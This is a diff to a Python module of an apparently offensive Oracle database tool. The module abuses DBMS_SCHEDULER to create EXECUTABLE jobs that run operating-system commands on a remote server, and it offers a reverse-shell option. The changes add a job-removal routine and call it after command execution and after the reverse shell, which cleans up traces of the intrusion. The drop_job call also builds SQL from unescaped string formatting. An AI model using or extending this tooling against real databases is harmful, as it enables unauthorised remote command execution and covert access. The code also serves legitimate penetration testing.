@@ -20,20 +20,49 @@ class DbmsScheduler (OracleDatabase):
 		OracleDatabase.__init__(self,args)
 		self.jobName = None
 
-	def __createJob__(self,cmd):
+	def __removeJob__(self, jobName, force=False, defer=True):
+		'''
+		Remove a Job from dbmssceduler
+		If force is set to TRUE, the Scheduler first attempts to stop the running job instances (by issuing the
+		STOP_JOB call with the force flag set to false), and then drops the jobs.
+		If defer is set to TRUE, the Scheduler allows the running jobs to complete and then drops the jobs.
+		Setting both force and defer to TRUE results in an error.
+		If both force and defer are set to FALSE and a job is running at the time of the call, the attempt
+		to drop that job fails.
+		Dropping a job requires ALTER privileges on the job either as the owner of the job or as a user with
+		the ALTER object privilege on the job or the CREATE ANY JOB system privilege.
+		Return True if no error, otherwise return Exception
+		'''
+		parameters = {'job_name': jobName, 'force': force, 'defer': defer} #'force': force, 'defer': defer
+		cursor = cx_Oracle.Cursor(self.args['dbcon'])
+		try:
+			logging.info("Trying to remove job {0}".format(jobName))
+			#cursor.callproc(name="DBMS_SCHEDULER.drop_job", keywordParameters=parameters)
+			cursor.execute("begin DBMS_SCHEDULER.drop_job('{0}', {1}, {2}); end;".format(jobName, force, defer))
+		except Exception as e:
+			logging.info('Error with DBMS_SCHEDULER.drop_job: {0}'.format(self.cleanError(e)))
+			return ErrorSQLRequest(e)
+		if defer == False:
+			logging.info("Job {0} has been removed".format(jobName))
+		else:
+			logging.info("When job will be completed, the job {0} will be dropped".format(jobName))
+		return True
+
+	def __createJob__(self, cmd):
 		'''
 		Create a job for DBMS_SCHEDULER
 		Be Careful: Special chars are not allowed in the command line
 		'''
 		logging.info('Create a job named {0}'.format(self.jobName))
 		splitCmd = cmd.split()
-		parameters = {'job_name':self.jobName,'job_type':'EXECUTABLE','job_action':splitCmd[0],'number_of_arguments':len(splitCmd)-1}
+		parameters = {'job_name':self.jobName,'job_type':'EXECUTABLE','job_action':splitCmd[0],'number_of_arguments':len(splitCmd)-1} #'auto_drop':True does not work with CX_Oralce. Why ?
 		cursor = cx_Oracle.Cursor(self.args['dbcon'])
 		try :
 			if self.args['show_sql_requests'] == True: logging.info("SQL request executed: DBMS_SCHEDULER.create_job with these parameters: {0}".format(parameters))
 			cursor.callproc(name="DBMS_SCHEDULER.create_job",keywordParameters=parameters)
+			#cursor.execute("begin DBMS_SCHEDULER.create_job(:job_name, :job_type, :job_action, :number_of_arguments, :auto_drop); end;", parameters)
 		except Exception as e: 
-			logging.info('Error with DBMS_SCHEDULER.create_job:{0}'.format(self.cleanError(e)))
+			logging.info('Error with DBMS_SCHEDULER.create_job: {0}'.format(self.cleanError(e)))
 			return ErrorSQLRequest(e)
 		else :
 			for pos,anArg in enumerate(splitCmd):
@@ -137,6 +166,7 @@ class DbmsScheduler (OracleDatabase):
 			except KeyboardInterrupt: 
 				self.args['print'].goodNews("Connection closed")
 			self.__getJobStatus__()
+			self.__removeJob__(self.jobName, force=False, defer=True)
 		else :
 			logging.error("The remote server OS ({0}) is unknown".format(self.remoteOS.lower()))
 		
@@ -152,6 +182,7 @@ class DbmsScheduler (OracleDatabase):
 			self.args['print'].goodNews("OK")
 		else : 
 			self.args['print'].badNews("KO")
+		self.__removeJob__(self.jobName, force=True, defer=False)
 
 
 def runDbmsSchedulerModule(args):
@@ -174,6 +205,7 @@ def runDbmsSchedulerModule(args):
 		else :
 			args['print'].badNews("The `{0}` command was not executed on the {1} server: {2}".format(args['exec'],args['server'],str(status)))
 		dbmsScheduler.__getJobStatus__()
+		dbmsScheduler.__removeJob__(dbmsScheduler.jobName, force=True, defer=False)
 	#Option 2: reverse shell
 	if args['reverse-shell'] != None :
 		args['print'].title("Try to give you a reverse shell from the {0} server".format(args['server']))
